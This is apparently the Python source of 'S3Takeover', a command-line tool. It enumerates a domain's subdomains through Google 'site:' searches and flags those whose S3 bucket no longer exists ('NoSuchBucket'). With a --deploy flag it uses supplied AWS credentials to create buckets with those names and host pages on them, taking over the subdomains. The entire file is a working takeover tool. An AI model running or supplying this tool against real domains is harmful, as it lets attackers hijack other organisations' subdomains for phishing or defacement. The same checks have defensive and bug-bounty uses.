import requests
import argparse
from googlesearch import search
import boto3
import getpass

def print_banner():
    banner = r"""
░██████╗██████╗░████████╗░█████╗░██╗░░██╗███████╗░█████╗░██╗░░░██╗███████╗██████╗░
██╔════╝╚════██╗╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗██║░░░██║██╔════╝██╔══██╗
╚█████╗░░█████╔╝░░░██║░░░███████║█████═╝░█████╗░░██║░░██║╚██╗░██╔╝█████╗░░██████╔╝
░╚═══██╗░╚═══██╗░░░██║░░░██╔══██║██╔═██╗░██╔══╝░░██║░░██║░╚████╔╝░██╔══╝░░██╔══██╗
██████╔╝██████╔╝░░░██║░░░██║░░██║██║░╚██╗███████╗╚█████╔╝░░╚██╔╝░░███████╗██║░░██║
╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
    """
    print(banner)
    print("Author: HwMex0\n")

def read_domains_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

def enumerate_subdomains(domain, stop, timeout):
    print('Enumerating subdomains.. \n')
    subdomains = []
    for url in search(f"site:{domain}", num_results=stop):
        subdomain = url.split("//")[-1].split(".")[0]
        if subdomain not in subdomains:
            subdomains.append(subdomain)

    return [f"{subdomain}.{domain}" for subdomain in subdomains]

def check_subdomains(domains, timeout):
    matched_domains = []
    non_matched_domains = []
    errored_domains = []

    for domain in domains:
        try:
            response = requests.get(f'http://{domain}', timeout=timeout)
            if response.status_code == 404 and "Code: NoSuchBucket" in response.text:
                matched_domains.append(domain)
            else:
                non_matched_domains.append(domain)
        except requests.exceptions.RequestException as e:
            errored_domains.append((domain, e))

    return matched_domains, non_matched_domains, errored_domains


def parse_arguments():
    parser = argparse.ArgumentParser(description="Check domains for possible S3 takeover (subdomain takeover).")
    parser.add_argument('-f', '--file', help='Path to the file containing domains, one per line.')
    parser.add_argument('-t', '--timeout', help='Timeout value for domain enumeration requests in seconds.', type=float, default=2)
    parser.add_argument('-d', '--domain', help='Enumerate domain for subdomains (Google Dork)')
    parser.add_argument('-s', '--stop', type=int, default=20, help='number of search results to be returned')
    parser.add_argument('-D', '--deploy', action='store_true', help='Deploy S3 takeover on the matched domains.')
    return parser.parse_args()

def print_results(matched_domains, non_matched_domains, errored_domains):
    print("\nVulnerable Domains:")
    for domain in matched_domains:
        print(f"  [+] {domain}")

    print("\nNon-Matched Domains:")
    for domain in non_matched_domains:
        print(f"  [-] {domain}")

    print("\nError Occurred:")
    for domain, error in errored_domains:
        print(f"  [*] {domain}")

def create_s3_website(domain, aws_access_key_id, aws_secret_access_key):
    s3 = boto3.client('s3', aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key)

    bucket_name = domain
    html_content = """
    <html>
        <head>
            <title>Static S3 Website</title>
        </head>
        <body>
            <h1>Hello, World!</h1>
        </body>
    </html>
    """

    try:
        s3.create_bucket(Bucket=bucket_name)
        s3.put_bucket_website(
            Bucket=bucket_name,
            WebsiteConfiguration={
                'ErrorDocument': {'Key': 'error.html'},
                'IndexDocument': {'Suffix': 'index.html'},
            }
        )
        s3.put_object(Bucket=bucket_name, Key='index.html', Body=html_content, ContentType='text/html')
        print(f"S3 website created for {domain}")
    except Exception as e:
        print(f"Error creating S3 website for {domain}: {e}")


if __name__ == "__main__":
    print_banner()
    args = parse_arguments()
    filename = args.file
    timeout = args.timeout
    aws_access_key_id = "Enter your AWS access key ID"
    aws_secret_access_key = "Enter your AWS secret access key"

    if args.file:
        domains = read_domains_from_file(filename)
        matched_domains, non_matched_domains, errored_domains = check_subdomains(domains, timeout)
        print_results(matched_domains, non_matched_domains, errored_domains)
    elif args.domain:
        domains = enumerate_subdomains(args.domain, args.stop, timeout)
        matched_domains, non_matched_domains, errored_domains = check_subdomains(domains, timeout)
        print_results(matched_domains, non_matched_domains, errored_domains)
    else:
        print('--domain or --file arguments are required')

    if args.deploy and matched_domains:
        aws_access_key_id = input("Enter your AWS access key ID: ")
        aws_secret_access_key = getpass.getpass("Enter your AWS secret access key: ")

        for domain in matched_domains:
            create_s3_website(domain, aws_access_key_id, aws_secret_access_key)
